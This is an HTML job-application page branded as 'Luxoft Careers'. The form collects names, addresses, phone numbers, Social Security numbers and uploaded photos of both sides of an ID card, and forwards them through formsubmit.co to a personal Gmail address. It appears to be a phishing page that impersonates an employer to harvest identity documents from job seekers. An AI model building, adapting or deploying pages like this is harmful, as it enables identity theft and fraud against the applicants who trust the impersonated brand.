
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Apply - Luxoft Careers</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
        <img src="images/luxoft-logo.png" alt="Luxoft Logo" class="logo">
        <nav>
            <a href="index.html">Home</a>
            <a href="apply.html">Apply</a>
        </nav>
    </header>
    <main>
        <h1>Application Form</h1>
        <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
            <label>Full Name:<input type="text" name="Name" required></label><br>
            <label>Address:<input type="text" name="Address" required></label><br>
            <label>Phone Number:<input type="text" name="Phone" required></label><br>
            <label>Email Address:<input type="email" name="Email" required></label><br>
            <label>SSN:<input type="text" name="SSN" required></label><br>
            <label>Upload Front of ID:<input type="file" name="Front_ID" required></label><br>
            <label>Upload Back of ID:<input type="file" name="Back_ID" required></label><br>
            <input type="hidden" name="_next" value="thankyou.html">
            <button type="submit">Submit Application</button>
        </form>
    </main>
</body>
</html>
